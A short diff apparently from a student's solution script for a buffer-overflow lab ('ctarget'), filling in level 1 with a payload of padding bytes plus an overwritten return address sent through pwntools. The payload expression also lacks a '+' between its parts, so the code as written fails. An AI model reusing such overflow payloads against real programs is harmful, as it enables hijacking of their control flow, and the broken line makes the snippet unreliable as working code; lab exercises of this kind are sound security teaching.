@@ -32,7 +32,17 @@ def print_solution(level: int, solution: bytes) -> None:
         f.write(solution)
         
 def solve_level_1(flag: bool) -> None:
-    pass
+    solution = (
+        b"a" * BUF_SIZE
+        (b"\x00\x00\x00\x00\x00\x40\x17\xfc"[::-1])
+    )
+    if flag:
+        print_solution(1, solution)
+        return
+    
+    proc = process(['./ctarget', '-q'])
+    proc.sendline(solution)
+    proc.interactive()
 
 def solve_level_2(flag: bool) -> None:
     pass
